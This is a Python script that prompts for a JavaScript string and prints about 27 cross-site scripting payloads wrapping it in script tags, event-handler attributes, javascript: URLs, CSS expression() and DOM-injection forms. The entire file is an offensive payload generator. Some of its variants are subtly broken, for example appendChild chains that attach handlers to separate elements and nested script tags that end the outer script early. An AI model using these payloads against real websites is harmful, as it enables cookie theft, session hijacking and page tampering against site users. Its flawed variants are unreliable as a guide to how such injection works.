def generate_custom_xss_payloads(custom_payload):
    payloads = [
        f"<script>{custom_payload}</script>",
        f"<img src=x onerror={custom_payload}>",
        f"<svg onload={custom_payload}>",
        f"<body onload={custom_payload}>",
        f"<iframe src='javascript:{custom_payload}'></iframe>",
        f"<a href='javascript:{custom_payload}'>Click me</a>",
        f"<div style='width: expression({custom_payload})'></div>",
        f"<input type='text' value='XSS' onfocus={custom_payload}>",
        f"<button onclick={custom_payload}>Click me</button>",
        f"<marquee onstart={custom_payload}>XSS</marquee>",
        f"<object data='javascript:{custom_payload}'></object>",
        f"<embed src='javascript:{custom_payload}'></embed>",
        f"<script>document.write('<img src=x onerror={custom_payload}>')</script>",
        f"<script>document.cookie='XSS=1'</script>",
        f"<script>document.location='javascript:{custom_payload}'</script>",
        f"<script>document.write('<script>{custom_payload}</script>')</script>",
        f"<script>document.body.innerHTML='<script>{custom_payload}</script>'</script>",
        f"<script>document.body.appendChild(document.createElement('script')).innerHTML='{custom_payload}'</script>",
        f"<script>document.body.appendChild(document.createElement('img')).src='x';document.body.appendChild(document.createElement('img')).onerror={custom_payload}</script>",
        f"<script>document.body.appendChild(document.createElement('iframe')).src='javascript:{custom_payload}'</script>",
        f"<script>document.body.appendChild(document.createElement('a')).href='javascript:{custom_payload}';document.body.appendChild(document.createElement('a')).innerHTML='Click me'</script>",
        f"<script>document.body.appendChild(document.createElement('div')).style.width='expression({custom_payload})'</script>",
        f"<script>document.body.appendChild(document.createElement('input')).type='text';document.body.appendChild(document.createElement('input')).value='XSS';document.body.appendChild(document.createElement('input')).onfocus={custom_payload}</script>",
        f"<script>document.body.appendChild(document.createElement('button')).onclick={custom_payload};document.body.appendChild(document.createElement('button')).innerHTML='Click me'</script>",
        f"<script>document.body.appendChild(document.createElement('marquee')).onstart={custom_payload};document.body.appendChild(document.createElement('marquee')).innerHTML='XSS'</script>",
        f"<script>document.body.appendChild(document.createElement('object')).data='javascript:{custom_payload}'</script>",
        f"<script>document.body.appendChild(document.createElement('embed')).src='javascript:{custom_payload}'</script>"
    ]

    for payload in payloads:
        print(payload)

def main():
    custom_payload = input("Enter your custom payload: ")
    generate_custom_xss_payloads(custom_payload)

if __name__ == "__main__":
    main()
